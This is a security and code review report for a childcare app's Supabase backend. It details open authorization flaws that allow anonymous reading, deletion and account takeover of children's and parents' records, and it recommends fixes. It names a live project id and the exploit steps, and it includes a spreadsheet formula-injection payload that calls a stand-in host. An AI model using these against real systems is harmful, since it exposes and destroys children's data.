# Fifth Sweep — Full Code, UI & Compliance Review (2026-08-02)

Reviewed at `v2.3.19`, commit `c69c7e7`. Scope: whole codebase (~26.5k lines JS,
~6.9k lines CSS, 17 HTML pages, 15 edge functions, 55 migrations) **plus live
production verification** against the Supabase catalog (project `dahdstopsumxnqvdclmy`).

Findings are labeled **R1–R23**. Severity reflects impact on children's data first.

> **Verification note:** every Critical finding below was confirmed against the
> *live production database*, not inferred from source. Where a claim rests on
> `pg_policies` / `pg_proc` / `information_schema`, the query is quoted so it can
> be re-run. Direct HTTP proof-of-exploit was not possible from the review sandbox
> (egress to `*.supabase.co` is blocked), so exploitability is established from
> grants + policies + function bodies, which is sufficient and authoritative.

---

## Executive summary

The application logic is in good shape. Escaping discipline is genuinely strong
(the FS4 stored-XSS fix held; I could not find a single unescaped render of an
attacker-writable field). Billing math is careful, `family_login` is well built,
the design-token system is coherent, and `dist/` is currently in sync with `js/`.

The problems are **not in the JavaScript**. They are in the database
authorization layer, and they are severe:

- **The public anonymous key can read every child and parent record in the
  system** — 145 children, 118 families — including bcrypt PIN hashes.
- **Any anonymous internet user can take over any parent or staff account** via
  two unauthenticated RPC calls. No PIN guessing required.
- **Any anonymous internet user can delete every child record.**
- **The admin audit log has never recorded a single action.** The table does not
  exist in production; 26 call sites silently swallow the failure.
- **`PRIVACY-AND-SECURITY-OVERVIEW.md` attests to controls that are not
  implemented**, including the audit trail and the RLS isolation guarantee.

R1–R5 should be treated as an active incident, not a backlog item.

| Severity | Count | Items |
|---|---|---|
| Critical | 5 | R1–R5 |
| High | 3 | R6–R8 |
| Medium | 8 | R9–R16 |
| Low | 7 | R17–R23 |

---

## CRITICAL

### R1 — The anon key can read every family and child record

`ss1_public_read_rpcs.sql` / `tighten_anon_rls_policies.sql` exist in the repo but
the permissive policies are still live. Confirmed in production:

```sql
select tablename, policyname, cmd, roles, qual from pg_policies
where schemaname='public' and tablename in ('families','students','registrations');
```

| table | policy | cmd | roles | qual |
|---|---|---|---|---|
| `families` | `anon select families` | SELECT | `{anon}` | `true` |
| `students` | `anon select students` | SELECT | `{anon}` | `true` |
| `registrations` | `anon select registrations` | SELECT | `{anon}` | `true` |
| `registration_dates` | `anon select registration_dates` | SELECT | `{anon}` | `true` |
| `staff` | `anon read` | SELECT | `{public}` | `true` |
| `staff_clock_events` | `anon read` | SELECT | `{public}` | `true` |
| `messages` | `anon select messages` | SELECT | `{anon}` | `true` |

The anon key is necessarily public — it ships in `js/supabase.js:357` and in every
committed `dist/*.min.js`. The Cloudflare Worker at `/sb/*` is a **transparent
pass-through** (`worker.js:163-200`) that forwards headers unchanged and adds no
filtering, so it is not a control boundary; the same key also works directly
against `https://dahdstopsumxnqvdclmy.supabase.co`.

Exposed today: **118 families** (`parent_name`, `parent_email`, `parent_phone`,
plus parent 2), **145 children** (`child_name`, `child_dob`), **552
registrations**, **5,502 care dates**, and the full staff roster and clock history.

Names and dates of birth of 145 children, retrievable by anyone with a browser
and thirty seconds. This is the finding that matters most.

### R2 — Anyone can take over any parent or staff account (no PIN needed)

`set_family_pin` is `SECURITY DEFINER` and **executable by `anon`**. Its body
takes only a family id and a new PIN — no old PIN, no session, no authorization
check of any kind:

```sql
CREATE OR REPLACE FUNCTION public.set_family_pin(
  p_family_id uuid, p_new_pin text, p_is_parent2 boolean DEFAULT false)
RETURNS void LANGUAGE plpgsql SECURITY DEFINER
SET search_path TO 'public','extensions'
AS $function$
BEGIN
    IF p_new_pin !~ '^\d{4,8}$' THEN RAISE EXCEPTION 'PIN must be 4–8 digits'; END IF;
    v_hash := crypt(p_new_pin, gen_salt('bf', 10));
    IF p_is_parent2 THEN UPDATE families SET parent2_pin_hash = v_hash WHERE id = p_family_id;
    ELSE                 UPDATE families SET pin_hash        = v_hash WHERE id = p_family_id; END IF;
END; $function$
```

Combined with R1 (which hands the attacker every `families.id`), full takeover of
any parent account is two anonymous requests: read the id, overwrite the PIN.
`set_staff_pin` has the identical shape for the staff roster and clock-in kiosk.

This also renders the login protections moot. `family_login` is otherwise
well-written — regex-validated input, bcrypt compare, 5-attempt lockout — but an
attacker never has to touch it. And even if they did, `anon` holds UPDATE on
`families` (below), so they can reset `login_attempts` and `login_locked`
themselves between guesses.

### R3 — bcrypt PIN hashes are readable by anon

Column-level check confirms `pin_hash` and `parent2_pin_hash` are both in the
`anon` SELECT grant for `families`:

```sql
select column_name from information_schema.column_privileges
where table_name='families' and grantee='anon' and privilege_type='SELECT';
-- → includes pin_hash, parent2_pin_hash
```

Family PINs are 4–8 digits. A 4-digit PIN is a 10,000-candidate keyspace; bcrypt
cost 10 makes that a few minutes offline per family, entirely undetectable. The
5-attempt lockout is an online control and does nothing here.

`PRIVACY-AND-SECURITY-OVERVIEW.md` §3.2 says these hashes are safe because an
attacker would need to view "the raw database." They do not — the REST API serves
them to unauthenticated callers.

### R4 — Anyone can delete or alter every child record

Beyond reads, `anon` holds destructive policies:

| table | policy | cmd | qual |
|---|---|---|---|
| `students` | `anon delete students` | DELETE | `true` |
| `students` | `anon update students` | UPDATE | `true` |
| `families` | `anon update families` | UPDATE | `true` |
| `staff_clock_events` | `anon update clock events` | UPDATE | `true` |
| `settings` | `anon insert settings` | INSERT | `true` |

`DELETE FROM students` with the public key wipes all 145 child records. There is
no soft-delete and no application-level undo. `anon update families` additionally
permits silent tampering with contact details and lock flags, and the
`staff_clock_events` UPDATE allows cross-staff payroll tampering (previously
logged as FS24, still open).

### R5 — The admin audit log does not exist and never has

`add_audit_log.sql` was never applied to production. The table, the view, and the
RPC are all absent:

```sql
select table_name from information_schema.tables
 where table_schema='public' and table_name ilike '%audit%'
union all
select 'ROUTINE:'||routine_name from information_schema.routines
 where routine_schema='public' and routine_name ilike '%audit%';
-- → [] (empty)
```

Meanwhile `js/supabase.js:2716` calls the missing `log_admin_action` RPC from
**26 sites** across billing, calendar, families, settings and reports — and
deliberately swallows the error:

```js
} catch (err) {
    // Non-fatal: log to console but never let audit failure break the UI action
    console.warn('logAdminAction failed:', err.message);
}
```

The comment is reasonable in isolation; the effect is that a control the program
depends on failed 100% of the time and never surfaced. Separately,
`fetchAuditLog()` (`js/supabase.js:2731`) queries the non-existent
`admin_audit_log_recent` view, so the admin-facing log viewer is dead too.

Every admin action taken since launch — deleted registrations, changed billing
amounts, locked accounts — is unrecorded and unreconstructable. This is exactly
the classic footgun CLAUDE.md warns about: *a committed migration is not a
deployed one.*

---

## HIGH

### R6 — The compliance document attests to controls that do not exist

`PRIVACY-AND-SECURITY-OVERVIEW.md` is written for a non-technical audience (board,
licensing, parents) and materially misstates the security posture. This is a
governance problem distinct from the technical findings — someone may already
have relied on it.

| § | Claim | Reality |
|---|---|---|
| 3.3 | "A family logged in to their account cannot see any other family's records even if they tried to access them directly." | Anyone — not even logged in — can read all of them (R1). |
| 3.6 | "Every significant action … is automatically recorded in a permanent audit log … an authoritative, tamper-evident record." | The table does not exist; zero rows have ever been written (R5). |
| 3.2 | Hashes safe unless someone "viewed the raw database." | The REST API serves them anonymously (R3). |
| Part 6 table | "Access controls — **Compliant** — RLS in database + role-based admin permissions" | Not accurate as written. |

The COPPA framing in Part 1 is correct and worth keeping. But COPPA §312.8
requires reasonable security for children's data, and R1–R4 are not consistent
with that. Recommend correcting this document **in the same change** that fixes
R1–R5 — not before (it would document a live vulnerability) and not after
(it would remain misleading in the interim).

### R7 — CI auto-merges to production with no gate whatsoever

`.github/workflows/auto-merge-claude.yml` triggers on any push to `claude/**`,
merges straight into `main` with `contents: write`, pushes, and immediately runs
`npx wrangler deploy`. There is no test run, no build verification, no lint, and
no human review anywhere in the path.

This is a deliberate design choice and it does make the cloud-session workflow
smooth. But the blast radius is a live system holding children's PII, and the
same automation resolves version conflicts by *taking the incoming branch's
`dist/` bundles* (lines 63–69) — a bundle built against a different `main`.
At minimum this workflow should run `npm run build` and fail the merge if
`git diff --exit-code dist/` is dirty, plus run the test suite once R8 is fixed.

### R8 — The test suite cannot catch a regression

`js/tests/business-logic.test.js` is 461 lines and 59 tests, and they all pass.
They also cannot fail for any reason related to production code, because the file
**re-implements every function it tests** rather than importing from `js/`:

```
js/tests/business-logic.test.js:67   function calcAgeMonths(...)
js/tests/business-logic.test.js:77   function getRoomIdFromDob(...)
js/tests/business-logic.test.js:92   function effectiveRate(...)
js/tests/business-logic.test.js:102  function getRegistrationWindow(...)
js/tests/business-logic.test.js:141  function calcTotalForTest(...)
js/tests/business-logic.test.js:185  function escHtml(...)
```

`calcTotalForTest` is the tell — the name concedes it is a copy. Change
`effectiveRate` in `js/supabase.js` to return garbage and all 59 tests still pass.

Compounding it: there is no `test` script in `package.json` and no CI step, so the
suite runs only when someone remembers to type `node js/tests/business-logic.test.js`.
Effective automated coverage of production code is **zero**. The tests have real
value as executable specification — the fix is to export the real functions and
import them, then wire `npm test` into R7's workflow.

---

## MEDIUM — Performance

### R9 — Every asset is `no-store`; ~1.5 MB re-downloads on every page view

`_headers:2` and `worker.js:410` both set `Cache-Control: no-store, no-cache,
must-revalidate` on **`/*`** — HTML, CSS, images, and the JS bundles alike.

`dist/admin.min.js` alone is **611 KB**, plus `supabase.min.js` at 60 KB. Nothing
is ever cached, so an admin reloading the dashboard re-fetches the entire bundle
every time, and parents re-download the full stack on each visit.

The bundles are already versioned by `js/build-version.js`, so this is
recoverable: keep `no-store` for HTML only, and serve `dist/*` and `css/*` with
`immutable`, long-`max-age`, content-hashed filenames. This is the single largest
available load-time win and it carries no security cost.

### R10 — Render-blocking third-party scripts, and no SRI

Every page loads CDN scripts with no `defer` and no `async`:

```html
<!-- admin.html:1917-1919 -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.4/dist/chart.umd.min.js"></script>
```

`xlsx.full.min.js` is roughly 900 KB and `chart.umd.min.js` roughly 200 KB. Both
block first paint of the admin dashboard on **every** load, though neither is
needed until an admin exports a spreadsheet or opens a chart tab — they should be
dynamically imported at first use.

Separately, none of the 13 CDN tags across the site carries an `integrity`
(SRI) hash, and `@supabase/supabase-js@2` is an unpinned floating major. The CSP
permits `cdn.jsdelivr.net` with both `unsafe-inline` and `unsafe-eval`, so a
compromised or substituted CDN asset would execute with full access to the admin
session and the anon key. Pin exact versions and add SRI hashes.

### R11 — Dashboard init fans out into separate one-row `settings` queries

`initDashboard()` (`js/admin/admin-init.js:19-28`) parallelises eight loaders, but
at least four are individual round-trips to the *same* table for a single key:

```js
loadRateSettings()      // settings.select('value').eq('key','room_rates')
loadRatioSettings()     // settings.select('value').eq('key','staff_ratios')
loadCapacitySettings()  // settings.select('value').eq('key','room_capacity')
loadOfferLinks()        // settings.select('value').eq('key','offer_links')
```

One `.in('key', [...])` call replaces all of them. `Promise.all` hides the cost in
wall-clock but it is still four connections and four round-trips per load.

### R12 — `fetchAllRegistrations()` is unbounded and near the PostgREST ceiling

`loadRegistrations()` calls `fetchAllRegistrations()` with no arguments
(`js/admin/admin-calendar.js:44`), and the function only applies a date filter when
one is passed (`js/supabase.js:545-561`). Every dashboard load therefore pulls
**all 552 registrations plus all 5,502 nested `registration_dates` rows**, and the
set grows monotonically — nothing ages out.

The sharper risk: PostgREST's default `db-max-rows` is 1,000. At 552 registrations
the table is over halfway there, and when it crosses, the response will be
**silently truncated** — no error, no warning, just registrations quietly missing
from the admin calendar and the capacity overview. Add explicit pagination or a
default month window before that happens, and confirm the project's configured
`max-rows` value.

---

## MEDIUM — UI & design consistency

### R13 — 163 native `alert()` calls against 25 `showToast()`

A styled toast system exists and is used 13% of the time. Everywhere else the app
falls back to blocking browser dialogs:

| file | `alert()` |
|---|---|
| `admin-reports.js` | 53 |
| `admin-billing.js` | 21 |
| `admin-families.js` | 17 |
| `admin-classrooms.js` | 14 |
| `admin-cacfp.js` / `admin-settings.js` | 13 each |
| *(+7 more files)* | 32 |

Plus 29 `confirm()` and one `prompt()`. Native dialogs are unstyled, block the
main thread, cannot be themed, look broken on mobile, and are visually unrelated
to the rest of the design system. Errors and successes should route through
`showToast()`, and destructive confirms through a styled modal — the app already
has modal infrastructure.

### R14 — Every link on the parent-facing site fails WCAG AA contrast

`css/styles.css:64` sets `a { color: var(--green); }` where `--green` is `#5BAD8B`.
Measured against the two surfaces it actually renders on:

| foreground | background | ratio | AA normal (4.5) |
|---|---|---|---|
| `--green` `#5BAD8B` | `--white` `#FFFFFF` | **2.69** | ✗ FAIL |
| `--green` `#5BAD8B` | `--cream` `#FDFAF0` | **2.58** | ✗ FAIL |
| `--tang` `#E97D55` | `--white` | **2.79** | ✗ FAIL |
| `--wlp-grad-fg` `#667EEA` | `#E5E8FB` | **3.01** | ✗ FAIL |

`--green` is also used for `.sub-label` in the admin (`css/admin.css:72`) and for
link colour in `lookup.css` and `waitlist-status.css` — so this affects parents,
who are the least captive audience and most likely to be on a phone outdoors.

The rest of the palette is fine and often excellent (`--text` on `--cream` is
13.68, `--navy` on `--sun` is 8.26). Darkening `--green` to roughly `#3D8266`
clears AA while staying on-brand; keep the current value as a `--green-accent`
token for borders and fills, where contrast rules do not apply.

### R15 — `maximum-scale=1.0` blocks pinch-zoom on the clock-in kiosk

```html
<!-- clockin.html -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
```

This disables pinch-zoom, a WCAG 2.1 §1.4.4 failure, on the one page staff use on a
shared tablet all day. The other 16 pages use the correct viewport meta. Drop
`maximum-scale`.

### R16 — Admin stylesheet has no visible focus styling

`css/styles.css` defines 10 `:focus-visible` rules. `css/admin.css` — 4,473 lines,
the entire staff-facing surface — defines **zero**. Keyboard and screen-reader
users navigating the admin dashboard get only the browser default outline, which
several of the custom button styles will suppress.

Also in this area:
- No `prefers-reduced-motion` block exists anywhere in the codebase.
- `admin.html` carries 24 `aria-*` attributes across 2,305 lines / 148 KB of
  markup, which is thin for an app of this interactive density.

---

## LOW

### R17 — CSV exports still allow spreadsheet formula injection (FS22, still open)

`csvCell()` (`js/admin/admin-core.js:160`) quotes commas, quotes and newlines but
does not neutralise a leading `=`, `+`, `-` or `@`. A parent-supplied child name of
`=HYPERLINK("https://evil.tld?"&A1)` executes when an admin opens the export in
Excel or Sheets. Prefix a `'` when the first character is one of those four.

### R18 — `admin-reports.js` is 5,910 lines

The largest module in the codebase by a factor of two, spanning payroll,
attendance, revenue, trends and seat-day capacity. These are four unrelated
reports sharing a file. Splitting along those seams would make the module
navigable and would materially reduce the "two `claude/**` branches editing shared
files" collision problem CLAUDE.md warns about.

### R19 — `CLAUDE.md` project-status section is substantially stale

Dated `2026-07-12` and **96 commits behind**. Concrete drift:
- Version examples reference `v1.17.6`; the app is at `v2.3.19`.
- **T2** is listed as open ("admin message inbox was deleted … nobody able to read
  it"). `js/admin/admin-messages.js` exists, renders the inbox, and escapes
  correctly. Resolved.
- **SS5** is described as "likely moot (the billing-by-email RPCs aren't
  deployed)". They are deployed — a later paragraph in the same document already
  contradicts the earlier one.
- The fourth-sweep list carries FS6–FS30 as open with no indication of which were
  since addressed.

The file is otherwise the single best onboarding artifact in the repo — the
"Hard-won operational notes" section is exactly right, and R5 is a direct
consequence of that section's warning going unheeded. Recommend collapsing the
per-sweep archaeology into `docs/CODE_REVIEW.md` and keeping CLAUDE.md to durable
rules plus a short pointer to the current open queue.

### R20 — Database hygiene items from the Supabase advisor

Full advisor output reviewed (68 lints, all parsed). Beyond the items already
raised above:
- `pin_reset_tokens` has RLS enabled with **zero policies** — correct by accident
  (service-role only), but it should be an explicit `USING (false)` so the intent
  is legible.
- `pg_trgm` is installed in the `public` schema; move it to `extensions`.
- `prevent_duplicate_care_date` has a mutable `search_path` — the one function
  missed by `harden_definer_search_path.sql`.
- Supabase Auth **leaked-password protection is disabled**; enabling it costs
  nothing and hardens admin logins.
- Public bucket `staff-photos` has a broad SELECT policy allowing clients to
  **list all files** — staff photographs enumerable by URL guessing.
- 46 further `rls_policy_always_true` warnings on `authenticated`-scoped tables.
  These are lower risk than R1–R4 (they require a valid admin login) but they mean
  the `restricted` and `staff` roles are enforced **only in the browser** — the
  database grants all three roles identical access. A `staff`-role user who opens
  devtools can read payroll and billing. Worth a follow-up sweep of its own.

### R21 — `family_login` leaks account existence

Returns a distinct `not_found` error for unknown emails versus `invalid_pin` for
known ones (verified in the deployed function body), letting an attacker confirm
whether a given family is enrolled. Minor next to R1, and worth folding into the
same fix: return a single generic failure.

### R22 — `.DS_Store` is committed at the repo root

Cosmetic, but it should be deleted and added to `.gitignore`.

### R23 — Build tooling is undocumented as a prerequisite

`npm run build` fails with `Cannot find module 'esbuild'` on a fresh clone until
`npm install` is run. CLAUDE.md's "Building for production" section jumps straight
to `npm run build`. One line fixes it; a fresh contributor otherwise hits a
confusing failure at exactly the step that must not be skipped.

Related: `scripts/bump-patch.js` updates `package.json` and `js/build-version.js`
but **not `package-lock.json`**, so the lock's `version` field drifts. It was found
at `2.3.15` against a `package.json` of `2.3.19` — five bumps behind. Harmless
today (the lock's dependency tree is what matters, and that is correct), but it
makes the lock a misleading record of what shipped. Add the lock to the bump
script's atomic write.

---

## Recommended sequence

**Immediately (R1–R5) — treat as an incident.** Note the documented history here:
a previous blanket RLS tighten broke parent login and was rolled back, so this
must be staged, not rushed.

1. **R2 first — it is the smallest fix with the largest effect.**
   `REVOKE EXECUTE ON FUNCTION set_family_pin, set_staff_pin FROM anon, authenticated, PUBLIC;`
   Route legitimate PIN changes through the already-authenticated
   `request-pin-reset` / `consume_pin_reset` flow. One statement, closes total
   account takeover, and cannot break login (the login path does not call it).
   Verify the reset-PIN flow still works, since it may call `set_family_pin`
   under the anon key today.
2. **R4 next — stop the destructive verbs.** Drop `anon delete students`,
   `anon update students`, `anon update families`, `anon update clock events`.
   Reads keep working, so login and registration are unaffected. Confirm first
   which of these the kiosk and the parent portal genuinely rely on.
3. **R5 — apply `add_audit_log.sql`**, then change `logAdminAction` to surface a
   one-time console error rather than a silent `warn`, so a future regression is
   visible. Then audit every other migration in `supabase/migrations/` against
   `information_schema` — R5 proves the drift is real and it is unlikely to be
   the only instance.
4. **R1 + R3 — the staged one.** This is SS1, and it is the change that broke
   login before. Move parent-facing reads behind `SECURITY DEFINER` RPCs that
   return only the caller's own family (the groundwork is already written in
   `ss1_public_read_rpcs.sql`), cut over the frontend, smoke-test parent login /
   kiosk / a test registration / admin tabs on staging, then drop the anon SELECT
   policies. Revoke `pin_hash` at the column level as the very first step —
   that part is safe to ship immediately and independently, since no client code
   reads the hash.
5. **R6 — correct the compliance document** in the same change that closes the
   above, and consider whether the PIN-hash exposure warrants notifying families.
   That is a judgment call for the church, not a technical one, but it should be
   made deliberately rather than by default.

**This month:** R7, R8 (quality gates — these are what prevent the next R5), then
R9/R10 for the load-time win.

**Backlog:** R11–R23.

---

## What is working well

Worth recording, both to keep it and because a review that only lists problems
gives a false picture of the codebase:

- **Output escaping is genuinely solid.** I scanned all 272 `innerHTML` sites for
  unescaped interpolation of anon-writable fields and found **no** live XSS. The
  FS4 fix held, and `admin-messages.js` correctly escapes the most
  attacker-reachable field in the system.
- **`family_login` is well built** — regex-validated input, bcrypt comparison,
  5-attempt lockout, no plaintext PIN anywhere. It is undermined by R2/R4, not by
  its own design.
- **The design-token system is coherent and well-commented** — 891 `var()` uses in
  `admin.css` against 170 hex literals. R14 is a wrong value in a good system,
  not an absent system.
- **The worker's push implementation** hand-rolls RFC 8291 / RFC 8188 correctly,
  and `/send-push` checks both Origin and a real Supabase session.
- **`dist/` is currently in sync with `js/`** — verified by a clean rebuild
  producing no diff.
- **CLAUDE.md's operational-notes section is excellent** and predicted R5 exactly.
